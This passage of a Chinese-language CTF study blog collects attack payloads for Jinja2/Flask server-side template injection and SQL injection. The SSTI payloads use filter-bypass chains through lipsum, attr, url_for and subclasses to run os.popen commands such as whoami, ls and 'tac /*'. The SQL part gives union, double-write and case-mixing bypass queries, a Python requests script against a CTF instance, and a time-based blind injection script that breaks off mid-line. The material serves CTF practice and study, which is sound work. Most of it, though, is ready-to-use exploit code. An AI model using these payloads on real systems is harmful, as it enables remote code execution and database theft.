<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;C:\Windows\win.ini&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">a.__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span>(g.pop.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).popen(<span class="string">&#x27;tac /*&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>



<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#filters">Template Designer 文档 — Jinja 文档 （3.2.x）</a></p>
<p>在 Jinja2 中，过滤器（Filters）用于对变量进行转换或格式化。过滤器可以用来修改变量的值，使其符合特定的格式或需求。过滤器在模板中使用管道符号 <code>|</code> 进行应用，可以链式调用多个过滤器</p>
<p>假设我们有以下模板变量：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;miHoYo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;items&#x27;</span>: [<span class="string">&#x27;zzz&#x27;</span>, <span class="string">&#x27;starrailway&#x27;</span>, <span class="string">&#x27;genshin&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;price&#x27;</span>: <span class="number">42.5</span>,</span><br><span class="line">    <span class="string">&#x27;now&#x27;</span>: datetime.now()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>常用过滤器</strong></p>
<ol>
<li><p>**<code>default</code>**：为变量提供默认值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; undefined_variable|default(&quot;No value&quot;) &#125;&#125;  &#123;# 输出：No value #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>length</code>**：获取列表或字符串的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|length &#125;&#125;  &#123;# 输出：3 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>lower</code><strong>、</strong><code>upper</code><strong>、</strong><code>title</code>**：转换字符串的大小写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; name|lower &#125;&#125;  &#123;# 输出：mihoyo #&#125;</span><br><span class="line">&#123;&#123; name|upper &#125;&#125;  &#123;# 输出：MIHOYO #&#125;</span><br><span class="line">&#123;&#123; name|title &#125;&#125;  &#123;# 输出：miHoYo #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>join</code>**：将列表元素连接成字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|join(&quot;, &quot;) &#125;&#125;  &#123;# 输出：zzz, starrailway, genshin #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>replace</code>**：替换字符串中的子串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;Hello World&quot;|replace(&quot;World&quot;, &quot;Jinja2&quot;) &#125;&#125;  &#123;# 输出：Hello Jinja2 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>format</code>**：格式化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;Price: %.2f&quot;|format(price) &#125;&#125;  &#123;# 输出：Price: 42.50 #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>select</code><strong>、</strong><code>reject</code>**：选择或排除列表中的元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|select(&quot;startswith&quot;, &quot;z&quot;)|list &#125;&#125;  &#123;# 输出：[&#x27;zzz&#x27;] #&#125;</span><br><span class="line">&#123;&#123; items|reject(&quot;endswith&quot;, &quot;z&quot;)|list &#125;&#125;  &#123;# 输出：[&#x27;starrailway&#x27;, &#x27;genshin&#x27;] #&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>**<code>date</code>**：格式化日期</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; now|date(&quot;%Y-%m-%d %H:%M:%S&quot;) &#125;&#125;  &#123;# 输出：当前日期和时间 #&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>多个过滤器链式调用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; items|length|default(0) &#125;&#125;  &#123;# 如果 items 是 None 或空的，输出 0 #&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们着重看看 <strong>set</strong> 和 <strong>attr()</strong></p>
<hr>
<h5 id="set"><a href="#set" class="headerlink" title="set"></a>set</h5><p><code>set</code> 过滤器在 Jinja2 中用于定义和赋值变量</p>
<p>先来看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set one = dict(c=a) | join | count %&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>dict(c=a)</code></strong></p>
<ul>
<li><strong>作用</strong>：创建一个字典，键是字符串 <code>&quot;c&quot;</code>，值是变量 <code>a</code></li>
<li><strong>示例</strong>：如果 <code>a</code> 的值是 <code>&quot;test&quot;</code>，那么 <code>dict(c=a)</code> 的结果是 <code>&#123;&quot;c&quot;: &quot;test&quot;&#125;</code></li>
</ul>
<p>那我们可以用这个构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a = <span class="built_in">dict</span>(po=a,p=a)|join %&#125;  &#123;<span class="comment"># 构造 &#x27;pop&#x27; #&#125;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> b = ( ()|select|string|<span class="built_in">list</span> )|attr(a)(<span class="number">24</span>) %&#125;  &#123;<span class="comment"># 构造 &#x27;_&#x27; #&#125;</span></span><br></pre></td></tr></table></figure>

<p>当然你要是构造不出  <code>_</code> 可以直接入手找 <code>_</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> one=<span class="built_in">dict</span>(c=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> two=<span class="built_in">dict</span>(cc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> three=<span class="built_in">dict</span>(ccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> four=<span class="built_in">dict</span>(cccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> five=<span class="built_in">dict</span>(ccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> six=<span class="built_in">dict</span>(cccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> seven=<span class="built_in">dict</span>(ccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eight=<span class="built_in">dict</span>(cccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(ccccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xxx=(lipsum|string|<span class="built_in">list</span>)%&#125;&#123;%<span class="built_in">print</span> xxx%&#125;</span><br></pre></td></tr></table></figure>

<p>数数看看<code>_</code>在第几个，然后拼接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">拼接数字为<span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">set</span> one=<span class="built_in">dict</span>(c=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> two=<span class="built_in">dict</span>(cc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> three=<span class="built_in">dict</span>(ccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> four=<span class="built_in">dict</span>(cccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> five=<span class="built_in">dict</span>(ccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> six=<span class="built_in">dict</span>(cccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> seven=<span class="built_in">dict</span>(ccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eight=<span class="built_in">dict</span>(cccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(ccccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xxx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(three*eight)%&#125;&#123;%<span class="built_in">print</span> xxx%&#125;</span><br></pre></td></tr></table></figure>

<p>其余情况可以构造一个链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a = dict(po=a,p=a)|join %&#125;  &#123;# 构造 &#x27;pop&#x27; #&#125;</span><br><span class="line">&#123;% set b = dict(glo=a, bals=a)|join %&#125;  &#123;# 构造 &#x27;globals&#x27; #&#125;</span><br><span class="line">&#123;% set c = dict(geti=a, tem=a)|join %&#125;  &#123;# 构造 &#x27;getitem&#x27; #&#125;</span><br><span class="line">&#123;% set d = dict(po=a, pen=a)|join %&#125;  &#123;# 构造 &#x27;popen&#x27; #&#125;</span><br><span class="line">&#123;% set e = dict(rea=a, d=a)|join %&#125;  &#123;# 构造 &#x27;read&#x27; #&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; lipsum|attr(b)|attr(c)(dict(o=a,s=a)|join)|attr(d)(dict(l=a,s=a)|join)|attr(e)() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
<hr>
<h5 id="attr"><a href="#attr" class="headerlink" title="attr()"></a>attr()</h5><p>当某些字符如点号 (<code>.</code>)、中括号 (<code>[]</code>) 或引号被过滤时</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>) &#125;&#125;  <span class="comment"># 相当于 &#123;&#123; &#x27;&#x27;.__class__ &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>链式调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">77</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#123;&#x27;&#x27;__class__.__base__.__subclasses__()[77]&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="lipsum"><a href="#lipsum" class="headerlink" title="lipsum"></a>lipsum</h4><p><code>lipsum</code> 是一个全局的函数或变量，它通常用于生成随机文本，但在 SSTI 攻击中，它也可以被用来获取内置模块或函数</p>
<p><code>ipsum.__globals__</code> 是一个字典，包含了在 <code>lipsum</code> 函数定义时的全局变量。在 Jinja2 模板中，如果 <code>lipsum</code> 存在，攻击者可以利用它来访问全局变量，如 <code>__builtins__</code>、<code>os</code> 等模块</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>popen</code> 方法执行命令 <code>ls</code>，并调用 <code>read()</code> 方法读取输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>__import__</code> 函数导入 <code>os</code> 模块，进而执行命令</p>
<p>那么结合一下前面的内容可以字符串拼接绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;so[::-1]&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用<code>attr</code>过滤器访问：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="url-for、get-flashed-messages"><a href="#url-for、get-flashed-messages" class="headerlink" title="url_for、get_flashed_messages"></a>url_for、get_flashed_messages</h4><p>这是flask内置的两个全局函数，两个都用<code>__globals__</code>键</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flask</span></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h4><p>python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串</p>
<p><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[__class__]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;&quot;</span>.encode().fromhex(<span class="string">&quot;5f5f636c6173735f5f&quot;</span>).decode()]</span><br></pre></td></tr></table></figure>



<h4 id="奇妙的思路"><a href="#奇妙的思路" class="headerlink" title="奇妙的思路"></a>奇妙的思路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(self.__dict__._TemplateReference__context.keys())%&#125;</span><br></pre></td></tr></table></figure>

<p>语句获取已经载入内存中的Flask内置函数</p>
<p>然后可以利用 lipsum</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum.__global__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;more /f*&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>





<h3 id="∞-一些不用动脑的"><a href="#∞-一些不用动脑的" class="headerlink" title="(∞)一些不用动脑的"></a>(∞)一些不用动脑的</h3><p><strong>Fenjing大法</strong></p>
<h3 id="3-基础例题"><a href="#3-基础例题" class="headerlink" title="(3)基础例题"></a>(3)基础例题</h3><h4 id="RUST下的SSTI"><a href="#RUST下的SSTI" class="headerlink" title="RUST下的SSTI"></a>RUST下的SSTI</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set my_var = <span class="title function_ invoke__">get_env</span>(name=<span class="string">&quot;FLAG&quot;</span>) %&#125;&#123;&#123;my_var&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><a href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF" class="headerlink" title="[HNCTF 2022 WEEK2]ez_SSTI | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2953">HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</a></h4><p>参数是name，测试得出模板是<code>jinja2</code>。</p>
<p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;</code></p>
<p>用这个找到<code>os._wrap_close</code>类。定位到了<code>137</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>查找用没有popen函数</p>
<p>发现有</p>
<p>则payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-综合绕过"><a href="#4-综合绕过" class="headerlink" title="(4)综合绕过"></a>(4)综合绕过</h3><h4 id="攻防世界-Web-python-template-injection"><a href="#攻防世界-Web-python-template-injection" class="headerlink" title="攻防世界 Web_python_template_injection"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> Web_python_template_injection</h4><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code></p>
<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('tac f14g').read()")&#125;&#125;</code></p>
<h4 id="LitCTF-2025-星愿信箱-NSSCTF"><a href="#LitCTF-2025-星愿信箱-NSSCTF" class="headerlink" title="LitCTF 2025]星愿信箱 | NSSCTF"></a><strong><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6776">LitCTF 2025]星愿信箱 | NSSCTF</a></strong></h4><p>SSTI</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><strong>判断字段数：</strong></p>
<ul>
<li>order by</li>
</ul>
<p><strong>information_schema数据库</strong></p>
<ul>
<li><strong>schemata</strong>: 保存当前整个服务器所有的数据库信息 库名</li>
<li><strong>tables</strong>: 保存当前整个服务器所有的数据表的信息 表名 table_name</li>
<li><strong>columns</strong>: 保存当前整个服务器所有的字段信息 字段名</li>
<li><strong>group_concat</strong>: 去重</li>
</ul>
<h3 id="1-联合查询"><a href="#1-联合查询" class="headerlink" title="(1)联合查询"></a>(1)联合查询</h3><h4 id="攻防世界-NewsCenter"><a href="#攻防世界-NewsCenter" class="headerlink" title="攻防世界 NewsCenter"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> NewsCenter</h4><p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#</code></p>
<p>&#x2F;&#x2F;news secret_table</p>
<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;secret_table&#39;#</code></p>
<p>&#x2F;&#x2F;id f14g</p>
<p><code>1&#39; union select 1,2,group_concat(fl4g) from secret_table#</code></p>
<p>&#x2F;&#x2F; QCTF{sq1_inJec7ion_ezzz}</p>
<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-极客大挑战-2019-BabySQL-Baby-SQL（双写绕过）"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-极客大挑战-2019-BabySQL-Baby-SQL（双写绕过）" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[极客大挑战 2019]BabySQL) Baby SQL（双写绕过）"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://buuoj.cn/challenges#[极客大挑战</a> 2019]BabySQL) Baby SQL（双写绕过）</h4><p><strong>试列数：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>（这个URL编码是#）</p>
<p><strong>爆数据库：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code></p>
<p><strong>爆表：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><strong>查字段名：</strong><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>PS: <strong>(双写绕过)</strong></p>
<p>因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</p>
<p>比如 union在程序员处理时被替换为空，那需要我们可以尝试把union改写为 un<font color="red">union</font>ion ，这样红色部分替换为空，则剩下的依然为union还可以结合大小写过滤一起使用</p>
<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-ez-sql-EZ-sql（大小写绕过）"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-ez-sql-EZ-sql（大小写绕过）" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）</h4><p>Payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb159c83-e932-48ed-88af-dbe07ad17a5a.node5.buuoj.cn:81/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(1,100):</span></span><br><span class="line">    <span class="comment">#payload = f&quot;TMP0919&#x27; Order by &#123;i&#125;%23&quot;</span></span><br><span class="line">    <span class="comment">#res = requests.get(url=url + payload)</span></span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="comment">#if(&quot;id&quot; not in res.text):</span></span><br><span class="line">    <span class="comment">#    print(f&quot;i = &#123;i&#125;&quot;)</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(TaBle_nAme) From infOrmation_schema.tables WHeRe Table_schema=Database())),2,3,4,5%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(column_name) From infOrmation_schema.columns WHeRe Table_name=&#x27;here_is_flag&#x27;)),2,3,4,5%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(flag) From here_is_flag)),2,3,4,5%23&quot;</span></span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="(2)时间盲注"></a>(2)时间盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze6irbn0iiiic2wnub2.cloudeci1.ichunqiu.com/index.html&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line"> low = <span class="number">32</span></span><br><span class="line"> high = <span class="number">128</span></span><br><span class="line"> mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">     time.sleep(<span class="number">0.2</span>)</span><br><span class="line">     payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="comment">#把payload里password换成username打username</span></span><br><span class="line">     datas = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment"># print(datas)</span></span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,data=datas)  <span class="comment">#json=data</span></span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     <span class="keyword">if</span> spend_time&gt;=<span class="number">0.4</span>: <span class="comment">#这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span></span><br><span class="line">         low = mid+<span class="number">1</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         high = 